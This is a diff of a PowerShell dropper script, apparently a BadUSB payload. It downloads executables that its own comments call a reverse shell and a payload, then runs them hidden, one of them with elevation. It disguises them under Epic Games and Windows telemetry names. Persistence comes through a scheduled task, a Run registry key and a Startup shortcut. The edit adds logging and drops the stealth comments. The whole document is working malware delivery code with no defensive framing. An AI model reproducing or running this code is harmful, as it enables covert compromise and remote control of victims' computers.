@@ -1,18 +1,12 @@
-
 # =======================
 # === CONFIG SECTION ===
 # =======================
 
-# Primary Reverse Shell EXE
-$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/Obfuscated Programs/Epic-Games.exe"
+$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/Obfuscated%20Programs/Epic-Games.exe"
 $mainExePath = "$env:APPDATA\.exe"
 $mainTaskName = "Epic Games Manager"
 $mainRunKey = "Epic Games"
 
-# Secondary Payload EXE
-
-
-# One-Time Payload
 $telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
 $telemetryPath = "$env:TEMP\WinTelemetry.exe"
 
@@ -31,13 +25,15 @@ function Add-Persistence {
     try {
         # Download EXE if missing
         if (-not (Test-Path $exePath)) {
+            Write-Host "[INFO] Downloading payload from $exeUrl"
             Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
         }
 
-        # Start silently
+        # Start EXE silently
+        Write-Host "[INFO] Starting $exePath"
         Start-Process -FilePath $exePath -WindowStyle Hidden
 
-        # Scheduled task setup
+        # Create Scheduled Task
         $action = New-ScheduledTaskAction -Execute $exePath
         $triggers = @(
             New-ScheduledTaskTrigger -AtLogOn
@@ -48,15 +44,16 @@ function Add-Persistence {
         )
         $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)
 
-        # Create scheduled task if it doesn't already exist
-        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop)) {
+            Write-Host "[INFO] Registering scheduled task: $taskName"
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
         }
 
         # Registry fallback
+        Write-Host "[INFO] Setting Run key: $runKeyName"
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runKeyName -Value $exePath
 
-        # Startup folder shortcut
+        # Startup shortcut
         $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
         $shortcutPath = Join-Path $startupPath "$taskName.lnk"
         $WScriptShell = New-Object -ComObject WScript.Shell
@@ -65,8 +62,11 @@ function Add-Persistence {
         $shortcut.WorkingDirectory = Split-Path $exePath
         $shortcut.WindowStyle = 7
         $shortcut.Save()
+
+        Write-Host "[SUCCESS] Persistence setup completed."
+
     } catch {
-        # Silent failure for stealth
+        Write-Error "[ERROR] $($_.Exception.Message)"
     }
 }
 
@@ -81,11 +81,12 @@ Add-Persistence -exePath $mainExePath -exeUrl $mainExeUrl -taskName $mainTaskNam
 # ============================
 
 try {
+    Write-Host "[INFO] Downloading telemetry payload from $telemetryUrl"
     Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
+    Write-Host "[INFO] Running telemetry payload"
     Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
     Start-Sleep -Seconds 5
-    # Optionally delete it
     # Remove-Item -Path $telemetryPath -Force
 } catch {
-    # Silent fail
+    Write-Error "[ERROR - TELEMETRY] $($_.Exception.Message)"
 }
